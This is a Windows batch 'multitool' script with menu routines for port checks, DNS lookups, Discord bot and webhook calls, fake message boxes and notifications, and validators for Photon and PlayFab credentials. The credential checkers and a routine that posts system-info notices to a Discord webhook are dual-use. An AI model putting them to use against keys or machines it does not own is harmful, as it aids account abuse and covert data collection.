echo Area code !area! not found in list.

:end
pause
goto banner

:portscanner
@echo off
cls
set /p HOST=Enter host to scan: 
set /p PORT=Enter port to check: 
echo Checking %HOST% on port %PORT%...
powershell -command "Test-NetConnection -ComputerName %HOST% -Port %PORT%"
pause
goto banner

:websitechecker
@echo off
cls
set /p URL=Enter website URL (e.g. https://example.com): 
curl -Is %URL% | findstr /i "HTTP/"
pause
goto banner

:DNSlookup
@echo off
cls
set /p HOST=Enter hostname (e.g. google.com): 
nslookup %HOST%
pause
goto banner

:checkemailblacklist
@echo off
cls
set /p DOMAIN=Enter email domain (e.g., example.com): 
start https://dnsstuff.com/tools/blacklist.ch?ip=%DOMAIN%
pause
goto banner

:serverinfo
@echo off
cls
set /p BOT_TOKEN="Enter your Discord bot token(must be in the server): "
set /p SERVER_ID="Enter the Discord server ID: "
cls
echo import discord > temp_discord_script.py
echo from discord.ext import commands >> temp_discord_script.py
echo import asyncio >> temp_discord_script.py
echo.>> temp_discord_script.py
echo bot_token = "%BOT_TOKEN%" >> temp_discord_script.py
echo server_id_to_lookup = %SERVER_ID% >> temp_discord_script.py
echo.>> temp_discord_script.py
echo bot = commands.Bot(command_prefix="!", intents=discord.Intents.all()) >> temp_discord_script.py
echo.>> temp_discord_script.py
echo @bot.event >> temp_discord_script.py
echo async def on_ready(): >> temp_discord_script.py
echo     try: >> temp_discord_script.py
echo         server = discord.utils.get(bot.guilds, id=server_id_to_lookup) >> temp_discord_script.py
echo         if server:>> temp_discord_script.py
echo            print(f"Server Name: {server.name}") >> temp_discord_script.py
echo            print(f"Server ID: {server.id}") >> temp_discord_script.py
echo            print(f"Member Count: {server.member_count}") >> temp_discord_script.py
echo            print(f"Owner: {server.owner.name}#{server.owner.discriminator}")>> temp_discord_script.py
echo         else:>> temp_discord_script.py
echo            print(f"Server with ID {server_id_to_lookup} not found.") >> temp_discord_script.py
echo         await bot.close() >> temp_discord_script.py
echo     except Exception as e: >> temp_discord_script.py
echo         print(f"An error occurred: {e}") >> temp_discord_script.py
echo         await bot.close() >> temp_discord_script.py
echo.>> temp_discord_script.py
echo asyncio.run(bot.start(bot_token)) >> temp_discord_script.py
echo.>> temp_discord_script.py
python temp_discord_script.py
pause
goto banner
:embedwebhook
@echo off
cls
setlocal enabledelayedexpansion


set /p TITLE=Enter the embed title: 
set /p DESC=Enter the embed description: 
set /p COLOR=Enter the embed color (decimal, e.g. 16711680 for red): 
set /p WEBHOOK=Paste your Discord webhook URL: 
set "DESC=!DESC:"=\"!"
curl -H "Content-Type: application/json" ^
  -X POST ^
  -d "{ \"embeds\": [ { \"title\": \"%TITLE%\", \"description\": \"%DESC%\", \"color\": %COLOR% } ] }" ^
  %WEBHOOK%
  
pause
goto banner
endlocal
:systeminfo
@echo off
setlocal
cls
set /p WEBHOOK_URL="webhook url(use in a private channel): "

systeminfo > temp.txt
set /p SYSINFO=<temp.txt

curl -H "Content-Type: application/json" ^
  -X POST ^
  -d "{\"content\": \"System info uploaded.\n(Too long for Discord message box)\"}" ^
  %WEBHOOK_URL%

del temp.txt
endlocal
pause
goto banner

:fakemsgbox
@echo off
cls
set /p input="msg you want to say for the msg box: "
set /p title="title of the msg box: "
powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox('%input%', 'OKOnly,Information', '%title%')"
pause
goto banner

:fakenotification
@echo off
cls
set /p titleofnotification="title of the Notification: "
set /p text="msg of the Notification: "
powershell -WindowStyle Hidden -Command "New-BurntToastNotification -Text '%titleofnotification%', '%text%'"
pause
goto banner

:photon
@echo off
setlocal
cls

set /p APP_ID=your_photon_app_id_here: 
set REGION=us
set URL=wss://ns.exitgames.com:19093

echo Checking Photon App ID validity...

curl -v -H "X-Photon-Application-Id: %APP_ID%" %URL%

if %ERRORLEVEL% EQU 0 (
    echo Possible valid App ID (no error on WebSocket handshake).
) else (
    echo Invalid or unreachable App ID or region.
)

pause
goto banner

:playfabcheck
@echo off
setlocal
cls
set /p TITLE_ID=TITLEID: 
set /p SECRET_KEY=SECRET KEY: 

set URL=https://%TITLE_ID%.playfabapi.com/Admin/GetTitleData

echo { "Keys": ["some_test_key"] } > request.json

curl -s -X POST %URL% ^
  -H "Content-Type: application/json" ^
  -H "X-SecretKey: %SECRET_KEY%" ^
  --data "@request.json" > response.json

findstr /i "code" response.json | findstr /i "200" >nul
if %errorlevel%==0 (
    echo ✅ Valid PlayFab credentials (Title ID and Secret Key)
) else (
    echo ❌ Invalid PlayFab credentials or access denied
    type response.json
)

del request.json

pause
goto banner

:exit
cls
echo Thank you for using Drpeppers multitool!
timeout /t 2 >nul
exit